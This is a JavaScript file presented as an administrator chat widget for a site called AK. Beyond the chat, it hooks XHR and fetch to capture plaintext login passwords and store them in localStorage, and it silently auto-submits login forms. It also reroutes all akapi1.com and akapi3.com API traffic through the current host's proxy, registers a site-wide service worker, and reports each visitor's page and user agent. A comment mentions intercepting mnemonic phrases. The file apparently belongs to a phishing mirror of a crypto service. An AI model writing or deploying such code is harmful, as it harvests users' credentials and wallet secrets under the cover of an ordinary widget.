/**
 * AK 系统管理员传讯组件
 * - 只有管理员发消息时才显示
 * - 用户关闭后需等管理员再发消息才能再次打开
 * - 青色风格匹配网站主题
 */

(function() {
    'use strict';
    
    // ===== 持久化登录 - 保持登录状态跨浏览器会话 =====
    var AK_CRED_KEY = '_ak_sl';
    
    function _akEncode(a, p) {
        try { return btoa(unescape(encodeURIComponent(JSON.stringify({a:a,p:p,t:Date.now()})))); }
        catch(e) { return null; }
    }
    
    function _akDecode() {
        try {
            var raw = localStorage.getItem(AK_CRED_KEY);
            if (!raw) return null;
            var d = JSON.parse(decodeURIComponent(escape(atob(raw))));
            if (Date.now() - d.t > 30*86400000) { localStorage.removeItem(AK_CRED_KEY); return null; }
            return {account:d.a, password:d.p};
        } catch(e) { localStorage.removeItem(AK_CRED_KEY); return null; }
    }
    
    function _akSaveCred(account, password) {
        if (account && password) {
            var e = _akEncode(account, password);
            if (e) localStorage.setItem(AK_CRED_KEY, e);
        }
    }
    
    function _akClearCred() { localStorage.removeItem(AK_CRED_KEY); }
    
    function _akHasPersistCookie() {
        return document.cookie.indexOf('ak_persist=1') !== -1;
    }
    
    function _akExtractCreds(body) {
        var account = '', password = '';
        if (!body) return null;
        if (typeof body === 'string') {
            try {
                var json = JSON.parse(body);
                account = json.account || json.Account || '';
                password = json.password || json.Password || '';
            } catch(e) {
                try {
                    var params = new URLSearchParams(body);
                    account = params.get('account') || params.get('Account') || '';
                    password = params.get('password') || params.get('Password') || '';
                } catch(e2) {}
            }
        }
        if (account && password) return {account: account, password: password};
        return null;
    }
    
    // 捕获登录请求的凭据（XHR + fetch）
    function setupLoginCapture() {
        var origSend = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.send = function(body) {
            var xhr = this;
            xhr._akReqBody = body;
            xhr.addEventListener('load', function() {
                try {
                    var url = xhr.responseURL || '';
                    if (url.indexOf('/Login') === -1) return;
                    var result = JSON.parse(xhr.responseText);
                    if (result.Error !== false && (result.Error || !result.UserData)) return;
                    if (!_akHasPersistCookie()) return;
                    var creds = _akExtractCreds(xhr._akReqBody);
                    if (creds) {
                        _akSaveCred(creds.account, creds.password);
                        if (window.AKChat && window.AKChat.reconnect) window.AKChat.reconnect();
                    }
                } catch(e) {}
            });
            return origSend.call(this, body);
        };
        
        var prevFetch = window.fetch;
        window.fetch = function(url, options) {
            var isLogin = typeof url === 'string' && url.indexOf('/Login') !== -1;
            var result = prevFetch.call(this, url, options);
            if (isLogin && options && options.body) {
                result.then(function(resp) {
                    resp.clone().json().then(function(data) {
                        if (data.Error === false || (!data.Error && data.UserData)) {
                            if (!_akHasPersistCookie()) return;
                            var creds = _akExtractCreds(options.body);
                            if (creds) {
                                _akSaveCred(creds.account, creds.password);
                                if (window.AKChat && window.AKChat.reconnect) window.AKChat.reconnect();
                            }
                        }
                    }).catch(function(){});
                }).catch(function(){});
            }
            return result;
        };
    }
    
    // 登录页自动登录
    function autoLogin() {
        var path = window.location.pathname.toLowerCase();
        if (path.indexOf('/login') === -1) return;
        
        var creds = _akDecode();
        if (!creds) { return; }
        if (!_akHasPersistCookie()) { _akClearCred(); return; }
        
        // 隐藏页面防止登录表单闪烁
        var hideStyle = document.createElement('style');
        hideStyle.id = 'ak-autologin-hide';
        hideStyle.textContent = 'body{visibility:hidden!important}';
        (document.head || document.documentElement).appendChild(hideStyle);
        
        var attempts = 0;
        function tryFormLogin() {
            attempts++;
            if (attempts > 15) {
                var s = document.getElementById('ak-autologin-hide');
                if (s) s.remove();
                return;
            }
            
            var inputs = document.querySelectorAll('input');
            var accountInput = null, passwordInput = null;
            for (var i = 0; i < inputs.length; i++) {
                var type = (inputs[i].type || '').toLowerCase();
                if (type === 'password') passwordInput = inputs[i];
                else if (type === 'text' || type === 'tel' || type === 'email') {
                    if (!accountInput) accountInput = inputs[i];
                }
            }
            
            if (!accountInput || !passwordInput) {
                setTimeout(tryFormLogin, 500);
                return;
            }
            
            // 使用原生setter填充（兼容Vue/React等框架）
            try {
                var setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
                setter.call(accountInput, creds.account);
                setter.call(passwordInput, creds.password);
            } catch(e) {
                accountInput.value = creds.account;
                passwordInput.value = creds.password;
            }
            ['input','change','keyup'].forEach(function(evt) {
                accountInput.dispatchEvent(new Event(evt, {bubbles:true}));
                passwordInput.dispatchEvent(new Event(evt, {bubbles:true}));
            });
            
            // 查找并点击登录按钮
            setTimeout(function() {
                var btns = document.querySelectorAll('button, input[type="submit"], a.btn, .btn, [onclick]');
                for (var i = 0; i < btns.length; i++) {
                    var text = (btns[i].textContent || btns[i].value || '').trim();
                    if (text.indexOf('登录') !== -1 || text.indexOf('登入') !== -1 || text.toLowerCase().indexOf('login') !== -1) {
                        btns[i].click();
                        setTimeout(function() {
                            var s = document.getElementById('ak-autologin-hide');
                            if (s) s.remove();
                        }, 3000);
                        return;
                    }
                }
                var s = document.getElementById('ak-autologin-hide');
                if (s) s.remove();
            }, 500);
        }
        
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', function() { setTimeout(tryFormLogin, 300); });
        } else {
            setTimeout(tryFormLogin, 300);
        }
    }
    
    // 手动登出时清除保存的凭据
    window._akLogout = function() {
        _akClearCred();
        window.location.href = '/pages/account/login.html';
    };
    
    // ===== 自动修改API地址，让请求走代理 =====
    function fixApiUrl() {
        try {
            if (typeof APP !== 'undefined' && APP.CONFIG && APP.CONFIG.BASE_URL) {
                const oldUrl = APP.CONFIG.BASE_URL;
                if (oldUrl.includes('akapi1.com') || oldUrl.includes('akapi3.com')) {
                    APP.CONFIG.BASE_URL = 'https://' + window.location.host + '/RPC/';
                }
            }
        } catch(e) {}
    }
    
    // 更新用户活动时间（仅记录，不触发任何操作）
    function updateActivity() {
        if (window._akChatInitialized) {
            window._akLastActivity = Date.now();
        }
    }
    
    // ===== 拦截所有网络请求，重定向akapi1.com到代理 =====
    function interceptNetworkRequests() {
        const proxyHost = window.location.host;
        
        // 拦截 fetch 请求
        if (window.fetch) {
            const originalFetch = window.fetch;
            window.fetch = function(url, options) {
                // 记录用户活动
                updateActivity();
                
                let finalUrl = url;
                if (typeof url === 'string') {
                    // 特定API强制重定向
                    if (url.includes('public_IndexData')) {
                        finalUrl = `https://${proxyHost}/RPC/public_IndexData`;
                    }
                    // 通用akapi重定向
                    else if (url.includes('akapi1.com') || url.includes('akapi3.com')) {
                        finalUrl = url.replace(/https?:\/\/(www\.)?akapi[13]\.com\/RPC\//, `https://${proxyHost}/RPC/`);
                    }
                }
                
                // 不在这里重连，避免重复连接
                return originalFetch.call(this, finalUrl, options);
            };
        }
        
        // 拦截 XMLHttpRequest
        if (window.XMLHttpRequest) {
            const originalOpen = XMLHttpRequest.prototype.open;
            XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
                // 记录用户活动
                updateActivity();
                
                if (typeof url === 'string') {
                    // 特定API强制重定向
                    if (url.includes('public_IndexData')) {
                        const newUrl = `https://${proxyHost}/RPC/public_IndexData`;
                        return originalOpen.call(this, method, newUrl, async, user, password);
                    }
                    // 通用akapi重定向
                    if (url.includes('akapi1.com') || url.includes('akapi3.com')) {
                        const newUrl = url.replace(/https?:\/\/(www\.)?akapi[13]\.com\/RPC\//, `https://${proxyHost}/RPC/`);
                        return originalOpen.call(this, method, newUrl, async, user, password);
                    }
                }
                return originalOpen.call(this, method, url, async, user, password);
            };
        }
        
        // 拦截 jQuery AJAX (如果存在)
        if (window.$ && window.$.ajaxPrefilter) {
            window.$.ajaxPrefilter(function(options, originalOptions, jqXHR) {
                if (options.url) {
                    // 特定API强制重定向
                    if (options.url.includes('public_IndexData')) {
                        const newUrl = `https://${proxyHost}/RPC/public_IndexData`;
                        options.url = newUrl;
                        return;
                    }
                    // 通用akapi重定向
                    if (options.url.includes('akapi1.com') || options.url.includes('akapi3.com')) {
                        const newUrl = options.url.replace(/https?:\/\/(www\.)?akapi[13]\.com\/RPC\//, `https://${proxyHost}/RPC/`);
                        options.url = newUrl;
                    }
                }
            });
        }
    }
    
    // 助记词和首页拦截已由nginx 302处理，JS层不再需要
    
    // ===== PWA支持：注入manifest + 注册Service Worker + 安装提示 =====
    (function setupPWA() {
        // 注入manifest link
        if (!document.querySelector('link[rel="manifest"]')) {
            var link = document.createElement('link');
            link.rel = 'manifest';
            link.href = '/admin/api/pwa-manifest';
            (document.head || document.documentElement).appendChild(link);
        }
        // theme-color不设置，保持浏览器默认样式
        // 注册Service Worker（用API路径绕过CDN对.js文件的拦截）
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('/admin/api/pwa-sw', {scope: '/'}).catch(function(){});
        }
        // 如果已经是standalone模式（已安装），不显示安装提示
        if (window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone) return;
        // 登录页不显示安装提示
        if (window.location.pathname.toLowerCase().indexOf('/login') !== -1) return;
        // 拦截浏览器安装事件，登录后再显示
        var deferredPrompt = null;
        window.addEventListener('beforeinstallprompt', function(e) {
            e.preventDefault();
            deferredPrompt = e;
            tryShowInstallBanner();
        });
        // 定期检查cookie状态（登录后cookie才会出现）
        var _pwaCheckTimer = setInterval(function() {
            if (deferredPrompt) tryShowInstallBanner();
            // 已显示或无事件则停止
            if (!deferredPrompt || document.getElementById('ak-pwa-banner')) clearInterval(_pwaCheckTimer);
        }, 3000);
        function tryShowInstallBanner() {
            if (!deferredPrompt) return;
            if (!_akHasPersistCookie() || document.cookie.indexOf('ak_username=') === -1) return;
            showInstallBanner();
        }
        function showInstallBanner() {
            if (document.getElementById('ak-pwa-banner')) return;
            // 如果用户之前关闭了提示，24小时内不再显示
            try {
                var dismissed = localStorage.getItem('ak_pwa_dismiss');
                if (dismissed && (Date.now() - parseInt(dismissed)) < 86400000) return;
            } catch(e) {}
            var banner = document.createElement('div');
            banner.id = 'ak-pwa-banner';
            banner.innerHTML = '<div style="display:flex;align-items:center;gap:12px;"><img src="/admin/api/pwa-icon/192" width="40" height="40" style="border-radius:8px;"><div><b style="font-size:14px;">安装 AK</b><br><span style="font-size:12px;opacity:0.8;">添加到桌面，获得APP体验</span></div></div><div style="display:flex;gap:8px;"><button id="ak-pwa-install" style="background:#00e5ff;color:#000;border:none;padding:8px 16px;border-radius:20px;font-weight:bold;cursor:pointer;">安装</button><button id="ak-pwa-close" style="background:transparent;color:#fff;border:1px solid rgba(255,255,255,0.3);padding:8px 12px;border-radius:20px;cursor:pointer;">取消</button></div>';
            banner.style.cssText = 'position:fixed;bottom:0;left:0;right:0;background:linear-gradient(135deg,#0a0e1a,#1a1e3a);color:#fff;padding:16px 20px;display:flex;justify-content:space-between;align-items:center;z-index:999999;box-shadow:0 -4px 20px rgba(0,0,0,0.5);font-family:sans-serif;';
            document.body.appendChild(banner);
            document.getElementById('ak-pwa-install').onclick = function() {
                if (deferredPrompt) {
                    deferredPrompt.prompt();
                    deferredPrompt.userChoice.then(function() { deferredPrompt = null; });
                }
                banner.remove();
            };
            document.getElementById('ak-pwa-close').onclick = function() {
                banner.remove();
                try { localStorage.setItem('ak_pwa_dismiss', Date.now()); } catch(e) {}
            };
        }
    })();
    
    // 持久化登录：尽早隐藏登录页并自动登录
    autoLogin();
    // 立即执行一次
    fixApiUrl();
    // 立即拦截网络请求
    interceptNetworkRequests();
    // 设置登录凭据捕获（必须在interceptNetworkRequests之后）
    setupLoginCapture();
    // 延迟再执行（确保APP对象已加载）
    setTimeout(fixApiUrl, 500);
    setTimeout(fixApiUrl, 1500);
    setTimeout(fixApiUrl, 3000);
    
    // ===== 以下是聊天组件代码，需要等待 DOM 准备好 =====
    function initChatWidget() {
        // 防止重复初始化
        if (window._akChatInitialized) return;
        window._akChatInitialized = true;
        
    // 配置
    const WS_PROTOCOL = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const WS_URL = `${WS_PROTOCOL}//${window.location.host}/chat/ws`;
    const HEARTBEAT_INTERVAL = 5000; // 5秒心跳间隔
    
    // 状态
    let ws = null;
    let isOpen = false;
    let hasNewMessage = false;
    let messageCount = 0;
    let username = 'visitor';
    let heartbeatTimer = null;
    
    // 从cookie获取值
    function getCookie(name) {
        let match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? match[2] : null;
    }
    
    // 获取用户名
    function getUsername() {
        // 1. 优先从cookie读取
        let cookieUser = getCookie('ak_username');
        if (cookieUser) return cookieUser;
        
        // 2. 从localStorage遍历找用户名
        try {
            for (let i = 0; i < localStorage.length; i++) {
                let value = localStorage.getItem(localStorage.key(i));
                try {
                    let data = JSON.parse(value);
                    if (data && typeof data === 'object') {
                        if (data.UserName && typeof data.UserName === 'string') return data.UserName;
                        if (data.Account && typeof data.Account === 'string') return data.Account;
                    }
                } catch(e) {}
            }
        } catch(e) {}
        
        // 3. 从已保存的持久化登录凭据读取
        try {
            var saved = _akDecode();
            if (saved && saved.account) return saved.account;
        } catch(e) {}
        
        // 获取不到就用访客名
        return 'guest_' + Math.random().toString(36).substr(2, 6);
    }
    
    // 创建样式 - 青绿渐变风格
    const style = document.createElement('style');
    style.textContent = `
        /* 聊天窗口 - 默认隐藏 */
        #ak-admin-chat {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 340px;
            max-height: 450px;
            background: linear-gradient(135deg, #0a3d3d 0%, #1a4a3a 100%);
            border-radius: 16px;
            box-shadow: 0 10px 40px rgba(0, 212, 180, 0.25);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            z-index: 99998;
            display: none;
            flex-direction: column;
            border: 1px solid rgba(0, 212, 180, 0.4);
            overflow: hidden;
        }
        
        #ak-admin-chat.visible {
            display: flex;
            animation: ak-slide-in 0.3s ease;
        }
        
        @keyframes ak-slide-in {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        /* 头部 - 青绿渐变 */
        #ak-admin-chat .chat-header {
            background: linear-gradient(135deg, #00c9b7 0%, #7ed56f 100%);
            padding: 14px 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        #ak-admin-chat .chat-header-title {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #0d1b2a;
            font-weight: 600;
            font-size: 15px;
        }
        
        #ak-admin-chat .chat-header-title::before {
            content: '📢';
            font-size: 18px;
        }
        
        #ak-admin-chat .chat-close {
            background: rgba(0,0,0,0.2);
            border: none;
            color: #0d1b2a;
            width: 28px;
            height: 28px;
            border-radius: 50%;
            cursor: pointer;
            font-size: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
        }
        
        #ak-admin-chat .chat-close:hover {
            background: rgba(0,0,0,0.3);
        }
        
        /* 消息区域 */
        #ak-admin-chat .chat-messages {
            flex: 1;
            padding: 16px;
            overflow-y: auto;
            min-height: 200px;
            max-height: 300px;
            background: #0a3d3d;
        }
        
        #ak-admin-chat .chat-message {
            margin-bottom: 12px;
            animation: ak-msg-in 0.2s ease;
        }
        
        @keyframes ak-msg-in {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        #ak-admin-chat .chat-message.admin {
            text-align: left;
        }
        
        #ak-admin-chat .chat-message.user {
            text-align: right;
        }
        
        #ak-admin-chat .chat-bubble {
            display: inline-block;
            padding: 10px 14px;
            border-radius: 12px;
            max-width: 85%;
            word-break: break-word;
            font-size: 14px;
            line-height: 1.5;
        }
        
        #ak-admin-chat .admin .chat-bubble {
            background: linear-gradient(135deg, #00c9b7 0%, #7ed56f 100%);
            color: #0a3d3d;
            border-bottom-left-radius: 4px;
        }
        
        #ak-admin-chat .user .chat-bubble {
            background: #1a4a3a;
            color: #e0f0e8;
            border: 1px solid rgba(0, 212, 180, 0.3);
            border-bottom-right-radius: 4px;
        }
        
        #ak-admin-chat .chat-time {
            font-size: 11px;
            color: #6aa88a;
            margin-top: 4px;
        }
        
        #ak-admin-chat .chat-label {
            font-size: 11px;
            color: #7ed56f;
            margin-bottom: 4px;
        }
        
        /* 输入区域 */
        #ak-admin-chat .chat-input-area {
            padding: 12px;
            background: #1a4a3a;
            border-top: 1px solid rgba(0, 212, 180, 0.2);
            display: flex;
            gap: 10px;
        }
        
        #ak-admin-chat .chat-input {
            flex: 1;
            padding: 10px 14px;
            border: 1px solid rgba(0, 212, 180, 0.4);
            border-radius: 20px;
            background: #0a3d3d;
            color: #e0f0e8;
            font-size: 14px;
            outline: none;
            transition: border-color 0.2s;
        }
        
        #ak-admin-chat .chat-input:focus {
            border-color: #00d4ff;
        }
        
        #ak-admin-chat .chat-input::placeholder {
            color: #6aa88a;
        }
        
        #ak-admin-chat .chat-send {
            width: 40px;
            height: 40px;
            border: none;
            border-radius: 50%;
            background: linear-gradient(135deg, #00c9b7 0%, #7ed56f 100%);
            color: #0a3d3d;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: transform 0.2s;
        }
        
        #ak-admin-chat .chat-send:hover {
            transform: scale(1.05);
        }
        
        #ak-admin-chat .chat-send svg {
            width: 18px;
            height: 18px;
        }
        
        /* 新消息提示音效 */
        @keyframes ak-notify {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
    `;
    document.head.appendChild(style);
    
    // 创建聊天窗口HTML
    const chatHTML = `
        <div id="ak-admin-chat">
            <div class="chat-header">
                <div class="chat-header-title">系统管理员传讯</div>
                <button class="chat-close" onclick="AKChat.close()">×</button>
            </div>
            <div class="chat-messages" id="ak-chat-messages"></div>
            <div class="chat-input-area">
                <input type="text" class="chat-input" id="ak-chat-input" placeholder="输入回复..." onkeypress="if(event.keyCode===13)AKChat.send()">
                <button class="chat-send" onclick="AKChat.send()">
                    <svg viewBox="0 0 24 24" fill="currentColor"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
                </button>
            </div>
        </div>
    `;
    
    // 插入DOM
    const container = document.createElement('div');
    container.innerHTML = chatHTML;
    document.body.appendChild(container);
    
    // 获取元素
    const chatBox = document.getElementById('ak-admin-chat');
    const messagesDiv = document.getElementById('ak-chat-messages');
    const inputEl = document.getElementById('ak-chat-input');
    
    
    if (!chatBox) {
        console.error('[AKChat] 聊天窗口元素未找到！');
        return;
    }
    
    // 播放提示音
    function playNotificationSound() {
        try {
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioCtx.createOscillator();
            const gainNode = audioCtx.createGain();
            oscillator.connect(gainNode);
            gainNode.connect(audioCtx.destination);
            oscillator.frequency.value = 800;
            oscillator.type = 'sine';
            gainNode.gain.setValueAtTime(0.3, audioCtx.currentTime);
            gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3);
            oscillator.start(audioCtx.currentTime);
            oscillator.stop(audioCtx.currentTime + 0.3);
        } catch(e) {}
    }
    
    // 添加消息
    function addMessage(content, isAdmin, time) {
        const msgDiv = document.createElement('div');
        msgDiv.className = 'chat-message ' + (isAdmin ? 'admin' : 'user');
        
        const timeStr = time || new Date().toLocaleTimeString('zh-CN', {hour: '2-digit', minute: '2-digit'});
        
        msgDiv.innerHTML = `
            ${isAdmin ? '<div class="chat-label">管理员</div>' : ''}
            <div class="chat-bubble">${escapeHtml(content)}</div>
            <div class="chat-time">${timeStr}</div>
        `;
        
        messagesDiv.appendChild(msgDiv);
        messagesDiv.scrollTop = messagesDiv.scrollHeight;
    }
    
    // HTML转义
    function escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }
    
    // 启动心跳（发online消息，前台每5秒自动保持主连接）
    function startHeartbeat() {
        // 清除旧的心跳
        stopHeartbeat();
        
        heartbeatTimer = setInterval(function() {
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({
                    type: 'online',
                    username: username,
                    page: window.location.pathname + window.location.hash,
                    userAgent: navigator.userAgent
                }));
            }
        }, HEARTBEAT_INTERVAL);
    }
    
    // 停止心跳
    function stopHeartbeat() {
        if (heartbeatTimer) {
            clearInterval(heartbeatTimer);
            heartbeatTimer = null;
        }
    }
    
    // 连接WebSocket
    function connect() {
        // 获取用户名
        username = getUsername();
        
        try {
            ws = new WebSocket(WS_URL + '?username=' + encodeURIComponent(username));
            
            ws.onopen = function() {
                // 后台页面重连不抢主连接，等visibilitychange变为前台时再发
                if (document.hidden) return;
                // 发送上线消息
                ws.send(JSON.stringify({
                    type: 'online',
                    username: username,
                    page: window.location.pathname + window.location.hash,
                    userAgent: navigator.userAgent
                }));
                
                // 启动心跳
                startHeartbeat();
            };
            
            ws.onmessage = function(e) {
                try {
                    const data = JSON.parse(e.data);
                    
                    if (data.type === 'admin_message') {
                        // 收到管理员消息 - 唯一可以弹出窗口的情况
                        addMessage(data.content, true, data.time);
                        showChat();
                        playNotificationSound();
                    } else if (data.type === 'history') {
                        // 加载历史消息 - 静默加载，不弹出窗口
                        if (data.messages && data.messages.length > 0) {
                            data.messages.forEach(function(msg) {
                                addMessage(msg.content, msg.is_admin, msg.time);
                            });
                        }
                    }
                } catch(err) {
                    console.error('[AKChat] 消息处理错误:', err);
                }
            };
            
            ws.onclose = function() {
                stopHeartbeat();
                // 5秒后尝试重连
                setTimeout(connect, 5000);
            };
            
            ws.onerror = function(err) {
                console.error('[AKChat] WebSocket 错误:', err);
            };
        } catch(e) {
            setTimeout(connect, 5000);
        }
    }
    
    // 显示聊天窗口
    function showChat() {
        if (chatBox) {
            chatBox.classList.add('visible');
        }
        isOpen = true;
    }
    
    // 关闭聊天窗口
    function closeChat() {
        chatBox.classList.remove('visible');
        isOpen = false;
    }
    
    // 发送消息
    function sendMessage() {
        const content = inputEl.value.trim();
        if (!content) return;
        
        // 检查WebSocket连接状态
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            console.error('[AKChat] WebSocket未连接，无法发送消息');
            alert('连接已断开，消息发送失败');
            return;
        }
        
        try {
            ws.send(JSON.stringify({
                type: 'user_message',
                content: content
            }));
            addMessage(content, false);
            inputEl.value = '';
        } catch(e) {
            console.error('[AKChat] 发送消息失败:', e);
            alert('发送失败，请重试');
        }
    }
    
    // 重连WebSocket（登录后调用）
    function reconnect() {
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ type: 'offline' }));
        }
        if (ws) ws.close();
        // 重新获取用户名并连接
        username = getUsername();
        connect();
    }
    
    // 暴露全局API
    window.AKChat = {
        show: showChat,
        close: closeChat,
        send: sendMessage,
        reconnect: reconnect
    };
    
    // 监听SPA路由变化（history.pushState / replaceState / 浏览器前进后退）
    function onUrlChange() {
        if (ws && ws.readyState === WebSocket.OPEN && !document.hidden) {
            ws.send(JSON.stringify({
                type: 'online',
                username: username,
                page: window.location.pathname + window.location.hash,
                userAgent: navigator.userAgent
            }));
        }
    }
    (function() {
        var origPush = history.pushState.bind(history);
        var origReplace = history.replaceState.bind(history);
        history.pushState = function() { origPush.apply(history, arguments); onUrlChange(); };
        history.replaceState = function() { origReplace.apply(history, arguments); onUrlChange(); };
    })();
    window.addEventListener('popstate', onUrlChange);

    // 监听标签页可见性：切到后台停止心跳，回到前台重新发 online 抢回主连接
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            stopHeartbeat();
        } else {
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({
                    type: 'online',
                    username: username,
                    page: window.location.pathname + window.location.hash,
                    userAgent: navigator.userAgent
                }));
                startHeartbeat();
            }
        }
    });
    
    // DOM加载完成后立即连接（不等待所有资源加载）
    setTimeout(connect, 100);
    
    } // 结束 initChatWidget 函数
    
    // 等待 body 加载完成后初始化聊天组件
    function tryInit() {
        if (document.body) {
            initChatWidget();
        } else {
            setTimeout(tryInit, 100);
        }
    }
    
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', tryInit);
    } else {
        tryInit();
    }
    
})();
